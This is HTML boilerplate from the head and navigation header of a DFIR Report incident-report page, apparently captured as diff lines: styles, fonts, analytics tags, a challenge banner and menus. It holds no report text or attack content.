!important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
+/*# sourceURL=global-styles-inline-css */
+</style>
+
+<style type="text/css">@font-face {font-family:'DM Sans';font-style:normal;font-weight:100 1000;src:url(/cf-fonts/v/dm-sans/5.2.8/latin/opsz/normal.woff2);unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD;font-display:swap;}@font-face {font-family:'DM Sans';font-style:normal;font-weight:100 1000;src:url(/cf-fonts/v/dm-sans/5.2.8/latin-ext/opsz/normal.woff2);unicode-range:U+0100-02BA,U+02BD-02C5,U+02C7-02CC,U+02CE-02D7,U+02DD-02FF,U+0304,U+0308,U+0329,U+1D00-1DBF,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20C0,U+2113,U+2C60-2C7F,U+A720-A7FF;font-display:swap;}@font-face {font-family:'DM Sans';font-style:italic;font-weight:100 1000;src:url(/cf-fonts/v/dm-sans/5.2.8/latin-ext/opsz/italic.woff2);unicode-range:U+0100-02BA,U+02BD-02C5,U+02C7-02CC,U+02CE-02D7,U+02DD-02FF,U+0304,U+0308,U+0329,U+1D00-1DBF,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20C0,U+2113,U+2C60-2C7F,U+A720-A7FF;font-display:swap;}@font-face {font-family:'DM Sans';font-style:italic;font-weight:100 1000;src:url(/cf-fonts/v/dm-sans/5.2.8/latin/opsz/italic.woff2);unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD;font-display:swap;}@font-face {font-family:'Geist';font-style:normal;font-weight:100 900;src:url(/cf-fonts/v/geist/5.2.8/cyrillic/wght/normal.woff2);unicode-range:U+0301,U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116;font-display:swap;}@font-face {font-family:'Geist';font-style:normal;font-weight:100 900;src:url(/cf-fonts/v/geist/5.2.8/latin/wght/normal.woff2);unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD;font-display:swap;}@font-face {font-family:'Geist';font-style:normal;font-weight:100 900;src:url(/cf-fonts/v/geist/5.2.8/latin-ext/wght/normal.woff2);unicode-range:U+0100-02BA,U+02BD-02C5,U+02C7-02CC,U+02CE-02D7,U+02DD-02FF,U+0304,U+0308,U+0329,U+1D00-1DBF,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20C0,U+2113,U+2C60-2C7F,U+A720-A7FF;font-display:swap;}</style>
+<link rel='stylesheet' id='avia-module-main-css' href='https://thedfirreport.com/wp-content/themes/dfir/assets/css/main.css?ver=1.1.81' media='all' />
+<link rel='stylesheet' id='theme-single-common-css' href='https://thedfirreport.com/wp-content/themes/dfir/assets/css/single-common.css?ver=1.1.81' media='all' />
+<link rel='stylesheet' id='theme-gutenberg-css' href='https://thedfirreport.com/wp-content/themes/dfir/assets/css/gutenberg.css?ver=1.1.81' media='all' />
+<link rel='stylesheet' id='avia-module-offsets-css' href='https://thedfirreport.com/wp-content/themes/punch/assets/css/offsets.css?ver=1.0.94' media='all' />
+<link rel='stylesheet' id='punch-core-gutenberg-css' href='https://thedfirreport.com/wp-content/themes/punch/assets/css/gutenberg.css?ver=1.0.94' media='all' />
+<link rel='stylesheet' id='wp-block-heading-css' href='https://thedfirreport.com/wp-includes/blocks/heading/style.min.css?ver=7.0.2' media='all' />
+<link rel='stylesheet' id='wp-block-paragraph-css' href='https://thedfirreport.com/wp-includes/blocks/paragraph/style.min.css?ver=7.0.2' media='all' />
+<link rel='stylesheet' id='wp-block-preformatted-css' href='https://thedfirreport.com/wp-includes/blocks/preformatted/style.min.css?ver=7.0.2' media='all' />
+<link rel='stylesheet' id='wp-block-table-css' href='https://thedfirreport.com/wp-includes/blocks/table/style.min.css?ver=7.0.2' media='all' />
+<script id="avia-compat-js" src="https://thedfirreport.com/wp-content/themes/punch/assets/js/dist/avia/avia-compat.js?ver=1.0.96"></script>
+<link rel="https://api.w.org/" href="https://thedfirreport.com/wp-json/" /><link rel="alternate" title="JSON" type="application/json" href="https://thedfirreport.com/wp-json/wp/v2/posts/42828" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://thedfirreport.com/xmlrpc.php?rsd" />
+<link rel='shortlink' href='https://thedfirreport.com/?p=42828' />
+
+		<!-- GA Google Analytics @ https://m0n.co/ga -->
+		<script async src="https://www.googletagmanager.com/gtag/js?id=G-N6F85L400D"></script>
+		<script>
+			window.dataLayer = window.dataLayer || [];
+			function gtag(){dataLayer.push(arguments);}
+			gtag('js', new Date());
+			gtag('config', 'G-N6F85L400D');
+		</script>
+
+		<style>img#wpstats{display:none}</style>
+		<!-- Head & Footer Code: Site-wide HEAD section start (post) -->
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-N6F85L400D"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){ dataLayer.push(arguments); }
+  gtag('js', new Date());
+
+  gtag('config', 'G-N6F85L400D', {
+    send_page_view: true
+  });
+
+  gtag('config', 'UA-162747485-1', {
+    anonymize_ip: true
+  });
+</script>
+<!-- Head & Footer Code: Site-wide HEAD section end (post) -->
+<link rel="profile" href="https://gmpg.org/xfn/11" />
+<link rel="alternate" type="application/rss+xml" title="The DFIR Report RSS2 Feed" href="https://thedfirreport.com/feed/" />
+<link rel="pingback" href="https://thedfirreport.com/xmlrpc.php" />
+	<script>document.addEventListener("DOMContentLoaded",function(){document.documentElement.style.setProperty("--scrollBarWidth",window.innerWidth-document.body.clientWidth+"px")});</script>
+	<style>.ep-lottie-loaded{opacity:1!important}</style>	<noscript>
+		<link rel="stylesheet" href="https://thedfirreport.com/wp-content/themes/punch/assets/css/dist/no-js.css?v=1.0.94">
+	</noscript>
+    
+<link rel="icon" href="https://thedfirreport.com/wp-content/uploads/DFIR-Favicon-Image@2x.png" type="image/png">
+<link rel="icon" href="https://thedfirreport.com/wp-content/uploads/cropped-DFIR-Favicon-Image@2x-32x32.png" sizes="32x32" />
+<link rel="icon" href="https://thedfirreport.com/wp-content/uploads/cropped-DFIR-Favicon-Image@2x-192x192.png" sizes="192x192" />
+<link rel="apple-touch-icon" href="https://thedfirreport.com/wp-content/uploads/cropped-DFIR-Favicon-Image@2x-180x180.png" />
+<meta name="msapplication-TileImage" content="https://thedfirreport.com/wp-content/uploads/cropped-DFIR-Favicon-Image@2x-270x270.png" />
+
+<!-- custom styles set at your backend-->
+<style type='text/css' id='dynamic-styles'>
+</style>
+
+<!-- end custom styles-->
+
+<style type='text/css'>
+@font-face {font-family: 'fa-fontello'; font-weight: normal; font-style: normal; font-display: auto;
+src: url('https://thedfirreport.com/wp-content/themes/punch/assets/fonts/fa-fontello.woff2?ver=1.1.81') format('woff2'),
+url('https://thedfirreport.com/wp-content/themes/punch/assets/fonts/fa-fontello.woff?ver=1.1.81') format('woff'),
+url('https://thedfirreport.com/wp-content/themes/punch/assets/fonts/fa-fontello.ttf?ver=1.1.81') format('truetype'),
+url('https://thedfirreport.com/wp-content/themes/punch/assets/fonts/fa-fontello.svg?ver=1.1.81#fa-fontello') format('svg'),
+url('https://thedfirreport.com/wp-content/themes/punch/assets/fonts/fa-fontello.eot?ver=1.1.81'),
+url('https://thedfirreport.com/wp-content/themes/punch/assets/fonts/fa-fontello.eot?ver=1.1.81#iefix') format('embedded-opentype');
+} #top .avia-font-fa-fontello, body .avia-font-fa-fontello, html body [data-av_iconfont='fa-fontello']:before{ font-family: 'fa-fontello'; }
+
+@font-face {font-family: 'dfir-icons'; font-weight: normal; font-style: normal; font-display: auto;
+src: url('https://thedfirreport.com/wp-content/uploads/avia_fonts/dfir-icons/dfir-icons.woff2?ver=1.1.81') format('woff2'),
+url('https://thedfirreport.com/wp-content/uploads/avia_fonts/dfir-icons/dfir-icons.woff?ver=1.1.81') format('woff'),
+url('https://thedfirreport.com/wp-content/uploads/avia_fonts/dfir-icons/dfir-icons.ttf?ver=1.1.81') format('truetype'),
+url('https://thedfirreport.com/wp-content/uploads/avia_fonts/dfir-icons/dfir-icons.svg?ver=1.1.81#dfir-icons') format('svg'),
+url('https://thedfirreport.com/wp-content/uploads/avia_fonts/dfir-icons/dfir-icons.eot?ver=1.1.81'),
+url('https://thedfirreport.com/wp-content/uploads/avia_fonts/dfir-icons/dfir-icons.eot?ver=1.1.81#iefix') format('embedded-opentype');
+} #top .avia-font-dfir-icons, body .avia-font-dfir-icons, html body [data-av_iconfont='dfir-icons']:before{ font-family: 'dfir-icons'; }
+</style>
+</head>
+
+<body id="top" class="wp-singular post-template-default single single-post postid-42828 single-format-standard wp-theme-punch wp-child-theme-dfir rtl_columns av-curtain-numeric avia-responsive-images-support">
+
+	
+	<div id='wrap_all'>
+
+	
+<div id="header" class="header    has-bar ">
+    		<div class="announcement-banner">
+			<div class="announcement-banner-inner">
+					<div class="banner-text">Our next Digital Forensics Challenge is on September 26th</div>
+											<a href="https://dfirlabs.thedfirreport.com/dfirchallenge" class="banner-link">Click here to signup</a>
+									<button class="close-bar" onClick="(function(){ const header = document.getElementById('header'); const banner = document.querySelector('.announcement-banner'); if(header){ header.classList.remove('has-bar'); } if(document.documentElement){ document.documentElement.classList.remove('has-banner'); } if(banner){ banner.style.display = 'none'; } })()">X</button>
+			</div>
+		</div>
+		<div class="header-inner">
+		<div class="header-logo">
+				<a href="https://thedfirreport.com" class="logo aria-label="Dfir Logo">
+		<div class='logo-main'><img width="292" height="110" src="https://thedfirreport.com/wp-content/uploads/DFIR-REPORT-Logo@2x.png" class="attachment-full size-full" alt="" decoding="async" /></div><div class='logo-alternate'><img width="292" height="108" src="https://thedfirreport.com/wp-content/uploads/DFIR-White-Logo.png" class="attachment-full size-full" alt="" decoding="async" /></div>    </a>
+			</div>
+		<div class="header-menu">
+			<div class="menu-main-menu-container"><ul id="menu-main-menu" class="main-menu" role="menu"><li role="menuitem" id="menu-item-937" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-top-level menu-item-top-level-1"><a class="menu-item-inner" href="https://thedfirreport.com/reports/" tabindex="0"><span class="avia-menu-text">Public Reports</span></a></li>
+<li role="menuitem" id="menu-item-962" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-mega-parent  menu-item-top-level menu-item-top-level-2"><span class="menu-item-inner no-link"  tabindex="0"><span class="avia-menu-text">Products</span></span>
+<div class='avia_mega_div avia_mega3 nine units'>
+
+<ul role="menu" class="sub-menu">
+	<li role="menuitem" id="menu-item-49071" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children avia_mega_menu_columns_3 three units  avia_mega_menu_columns_first">
+	<ul role="menu" class="sub-menu">
+		<li role="menuitem" id="menu-item-938" class="menu-overview menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://thedfirreport.com/products/" tabindex="0"><span class="avia-menu-text">Products Overview</span></a></li>
+		<li role="menuitem" id="menu-item-946" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children"><a class="menu-item-inner" href="https://thedfirreport.com/products/threat-intel/" tabindex="0"><span class="avia-menu-text">Threat Intel</span></a>
+		<ul role="menu" class="sub-menu">
+			<li role="menuitem" id="menu-item-49370" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://thedfirreport.com/products/threat-feed/" tabindex="0"><span class="avia-menu-text">Threat Feed</span></a></li>
+			<li role="menuitem" id="menu-item-948" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://thedfirreport.com/products/threat-intel/private-dfir-reports/" tabindex="0"><span class="avia-menu-text">Private DFIR Reports</span></a></li>
+			<li role="menuitem" id="menu-item-947" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://thedfirreport.com/products/threat-intel/all-intel/" tabindex="0"><span class="avia-menu-text">All Intel</span></a></li>
+			<li role="menuitem" id="menu-item-941" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://thedfirreport.com/products/active-defense/" tabindex="0"><span class="avia-menu-text">Active Defense</span></a></li>
+		</ul>
+</li>
+		<li role="menuitem" id="menu-item-944" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://thedfirreport.com/products/dfir-labs/" tabindex="0"><span class="avia-menu-text">DFIR Labs</span></a></li>
+		<li role="menuitem" id="menu-item-942" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://thedfirreport.com/products/case-artifacts/" tabindex="0"><span class="avia-menu-text">Case Artifacts</span></a></li>
+	</ul>
+</li>
+	<li role="menuitem" id="menu-item-49069" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children avia_mega_menu_columns_3 three units ">
+	<ul role="menu" class="sub-menu">
+		<li role="menuitem" id="menu-item-49074" class="menu-spacer menu-item menu-item-type-custom menu-item-object-custom"><span class="menu-item-inner no-link"  tabindex="0"><span class="avia-menu-text">-</span></span></li>
+		<li role="menuitem" id="menu-item-943" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://thedfirreport.com/products/detection-pack/" tabindex="0"><span class="avia-menu-text">Detection Pack</span></a></li>
+		<li role="menuitem" id="menu-item-954" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://thedfirreport.com/products/ai-training-ground/" tabindex="0"><span class="avia-menu-text">AI Training Ground</span></a></li>
+	</ul>
+</li>
+	<li role="menuitem" id="menu-item-49070" class="featured-column menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children avia_mega_menu_columns_3 three units avia_mega_menu_columns_last">
+	<ul role="menu" class="sub-menu">
+		<li role="menuitem" id="menu-item-49072" class="menu-item menu-item-type-custom menu-item-object-custom"><span class="menu-item-inner no-link"  tabindex="0"><span class="avia-menu-text">-</span></span>    <div class="mega-menu-featured-post">
+                    <div class="mega-menu-featured-post-category">
+                <span class='ep-item-term ep-item-term-bruteratel'  >bruteratel</span>            </div>
+                <div class="mega-menu-featured-post-title">
+            <a href="https://thedfirreport.com/2025/09/29/from-a-single-click-how-lunar-spider-enabled-a-near-two-month-intrusion/" >
+                From a Single Click: How Lunar Spider Enabled a Near Two-Month Intrusion            </a>
+        </div>
+        <div class="mega-menu-featured-post-button">
+            <a href="https://thedfirreport.com/2025/09/29/from-a-single-click-how-lunar-spider-enabled-a-near-two-month-intrusion/"  class="avia-button avia-color-light-gray">Read More</a>
+        </div>
+    </div>
+    </li>
+		<li role="menuitem" id="menu-item-49073" class="menu-item menu-item-type-custom menu-item-object-custom"><span class="menu-item-inner no-link"  tabindex="0"><span class="avia-menu-text">-</span></span>    <div class="mega-menu-featured-post">
+                    <div class="mega-menu-featured-post-category">
+                <span class='ep-item-term ep-item-term-dragonforce'  >dragonforce</span>            </div>
+                <div class="mega-menu-featured-post-title">
+            <a href="https://thedfirreport.com/2025/09/08/blurring-the-lines-intrusion-shows-connection-with-three-major-ransomware-gangs/" >
+                Blurring the Lines: Intrusion Shows Connection With Three Major Ransomware Gangs            </a>
+        </div>
+        <div class="mega-menu-featured-post-button">
+            <a href="https://thedfirreport.com/2025/09/08/blurring-the-lines-intrusion-shows-connection-with-three-major-ransomware-gangs/"  class="avia-button avia-color-light-gray">Read More</a>
+        </div>
+    </div>
+    </li>
+	</ul>
+</li>
+</ul>
+
+</div>
+</li>
+<li role="menuitem" id="menu-item-963" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-mega-parent  menu-item-top-level menu-item-top-level-3"><span class="menu-item-inner no-link"  tabindex="0"><span class="avia-menu-text">Services</span></span>
+<div class='avia_mega_div avia_mega2 six units'>
+
+<ul role="menu" class="sub-menu">
+	<li role="menuitem" id="menu-item-49133" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children avia_mega_menu_columns_2 three units  avia_mega_menu_columns_first">
+	<ul role="menu" class="sub-menu">
+		<li role="menuitem" id="menu-item-940" class="menu-overview menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://thedfirreport.com/services/" tabindex="0"><span class="avia-menu-text">Services Overview</span></a></li>
+		<li role="menuitem" id="menu-item-953" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children"><a class="menu-item-inner" href="https://thedfirreport.com/services/training/" tabindex="0"><span class="avia-menu-text">Training</span></a>
+		<ul role="menu" class="sub-menu">
+			<li role="menuitem" id="menu-item-956" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://thedfirreport.com/services/training/threat-hunting/" tabindex="0"><span class="avia-menu-text">Threat Hunting</span></a></li>
+		</ul>
+</li>
+	</ul>
+</li>
+	<li role="menuitem" id="menu-item-49135" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children avia_mega_menu_columns_2 three units avia_mega_menu_columns_last">
+	<ul role="menu" class="sub-menu">
+		<li role="menuitem" id="menu-item-49134" class="menu-spacer menu-item menu-item-type-custom menu-item-object-custom"><span class="menu-item-inner no-link"  tabindex="0"><span class="avia-menu-text">-</span></span></li>
+		<li role="menuitem" id="menu-item-949" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children"><a class="menu-item-inner" href="https://thedfirreport.com/services/professional-services/" tabindex="0"><span class="avia-menu-text">Professional Services</span></a>
+		<ul role="menu" class="sub-menu">
+			<li role="menuitem" id="menu-item-952" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://thedfirreport.com/services/professional-services/integration/" tabindex="0"><span class="avia-menu-text">Integration</span></a></li>
+			<li role="menuitem" id="menu-item-950" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://thedfirreport.com/services/professional-services/cti-program-advisory/" tabindex="0"><span class="avia-menu-text">CTI Program Advisory</span></a></li>
+			<li role="menuitem" id="menu-item-951" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://thedfirreport.com/services/professional-services/incident-response-playbook/" tabindex="0"><span class="avia-menu-text">Incident Response Playbook</span></a></li>
+		</ul>
+</li>
+	</ul>
+</li>
+</ul>
+
+</div>
+</li>
+<li role="menuitem" id="menu-item-984" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-mega-parent  menu-item-top-level menu-item-top-level-4"><span class="menu-item-inner no-link"  tabindex="0"><span class="avia-menu-text">Company</span></span>
+<div class='avia_mega_div avia_mega2 six units'>
+
+<ul role="menu" class="sub-menu">
+	<li role="menuitem" id="menu-item-49131" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children avia_mega_menu_columns_2 three units  avia_mega_menu_columns_first">
+	<ul role="menu" class="sub-menu">
+		<li role="menuitem" id="menu-item-957" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://thedfirreport.com/company/about-us/" tabindex="0"><span class="avia-menu-text">About us</span></a></li>
+		<li role="menuitem" id="menu-item-960" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://thedfirreport.com/company/contact-us/" tabindex="0"><span class="avia-menu-text">Contact Us</span></a></li>
+	</ul>
+</li>
+	<li role="menuitem" id="menu-item-49130" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children avia_mega_menu_columns_2 three units avia_mega_menu_columns_last">
+	<ul role="menu" class="sub-menu">
+		<li role="menuitem" id="menu-item-49824" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://thedfirreport.com/company/collaboration/" tabindex="0"><span class="avia-menu-text">Collaboration</span></a></li>
+		<li role="menuitem" id="menu-item-959" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://thedfirreport.com/company/careers/" tabindex="0"><span class="avia-menu-text">Careers</span></a></li>
+	</ul>
+</li>
+</ul>
+
+</div>
+</li>
+<li role="menuitem" id="menu-item-958" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-mega-parent  menu-item-top-level menu-item-top-level-5"><a class="menu-item-inner" href="https://thedfirreport.com/company/analysts/" tabindex="0"><span class="avia-menu-text">Analysts</span></a></li>
+</ul></div>		</div>
+		<div class="secondary-menu">
+			<div class="menu-secondary-menu-container"><ul id="menu-secondary-menu" class="secondary-menu" role="menu"><li role="menuitem" id="menu-item-337" class="menu-button gray-color menu-item menu-item-type-custom menu-item-object-custom av-menu-button av-menu-button-colored menu-item-top-level menu-item-top-level-1"><a class="menu-item-inner" href="https://dfirlabs.thedfirreport.com/auth/login" tabindex="0"><span class="avia-menu-text">Access DFIR Labs</span></a></li>
+<li role="menuitem" id="menu-item-49282" class="menu-button new-tab menu-item menu-item-type-post_type menu-item-object-page av-menu-button av-menu-button-colored menu-item-top-level menu-item-top-level-2"><a class="menu-item-inner" href="https://thedfirreport.com/company/contact-us/" tabindex="0"><span class="avia-menu-text">Get in Touch</span></a></li>
+</ul></div>		</div>
+		<button class="hamburger-toggle" aria-label="Mobile Menu Toggle">
+			<div class="burger-box"></div>
+		</button>
+	</div>
+	<div class="hamburger-overlay"></div>
+	<div class="hamburger-content">
+		<div class="hamburger-content-inner">
+		    <div class="menu-burger-menu-container"><ul id="menu-burger-menu" class="main-menu" role="menu"><li role="menuitem" id="menu-item-49255" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-top-level menu-item-top-level-1"><a class="menu-item-inner" href="https://thedfirreport.com/reports/" tabindex="0"><span class="avia-menu-text">Public Reports</span></a></li>
+<li role="menuitem" id="menu-item-49078" class="menu-title menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-top-level menu-item-top-level-2"><span class="menu-item-inner no-link"  tabindex="0"><span class="avia-menu-text">Products</span></span>
+
+
+<ul role="menu" class="sub-menu">
+	<li role="menuitem" id="menu-item-49284" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://thedfirreport.com/products/" tabindex="0"><span class="avia-menu-text">Products Overview</span></a></li>
+	<li role="menuitem" id="menu-item-49080" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children"><span class="menu-item-inner no-link"  tabindex="0"><span class="avia-menu-text">Threat Intel</span></span>
+	<ul role="menu" class="sub-menu">
+		<li role="menuitem" id="menu-item-49287" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://thedfirreport.com/products/threat-intel/" tabindex="0"><span class="avia-menu-text">Threat intel Overview</span></a></li>
+		<li role="menuitem" id="menu-item-49371" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://thedfirreport.com/products/threat-feed/" tabindex="0"><span class="avia-menu-text">Threat Feed</span></a></li>
+		<li role="menuitem" id="menu-item-49288" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://thedfirreport.com/products/threat-intel/private-dfir-reports/" tabindex="0"><span class="avia-menu-text">Private DFIR Reports</span></a></li>
+		<li role="menuitem" id="menu-item-49289" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://thedfirreport.com/products/threat-intel/all-intel/" tabindex="0"><span class="avia-menu-text">All Intel</span></a></li>
+		<li role="menuitem" id="menu-item-49290" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://thedfirreport.com/products/active-defense/" tabindex="0"><span class="avia-menu-text">Active Defense</span></a></li>
+	</ul>
+</li>
+	<li role="menuitem" id="menu-item-49293" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://thedfirreport.com/products/dfir-labs/" tabindex="0"><span class="avia-menu-text">DFIR Labs</span></a></li>
+	<li role="menuitem" id="menu-item-49291" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://thedfirreport.com/products/case-artifacts/" tabindex="0"><span class="avia-menu-text">Case Artifacts</span></a></li>
+	<li role="menuitem" id="menu-item-49292" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://thedfirreport.com/products/detection-pack/" tabindex="0"><span class="avia-menu-text">Detection Pack</span></a></li>
+	<li role="menuitem" id="menu-item-49310" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://thedfirreport.com/products/ai-training-ground/" tabindex="0"><span class="avia-menu-text">AI Training Ground</span></a></li>
+</ul>
+</li>
+<li role="menuitem" id="menu-item-49090" class="menu-title menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-top-level menu-item-top-level-3"><span class="menu-item-inner no-link"  tabindex="0"><span class="avia-menu-text">Services</span></span>
+
+
+<ul role="menu" class="sub-menu">
+	<li role="menuitem" id="menu-item-49304" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://thedfirreport.com/services/" tabindex="0"><span class="avia-menu-text">Service Overview</span></a></li>
+	<li role="menuitem" id="menu-item-49309" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children"><a class="menu-item-inner" href="https://thedfirreport.com/services/training/" tabindex="0"><span class="avia-menu-text">Training</span></a>
+	<ul role="menu" class="sub-menu">
+		<li role="menuitem" id="menu-item-49311" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://thedfirreport.com/services/training/threat-hunting/" tabindex="0"><span class="avia-menu-text">Threat Hunting</span></a></li>
+	</ul>
+</li>
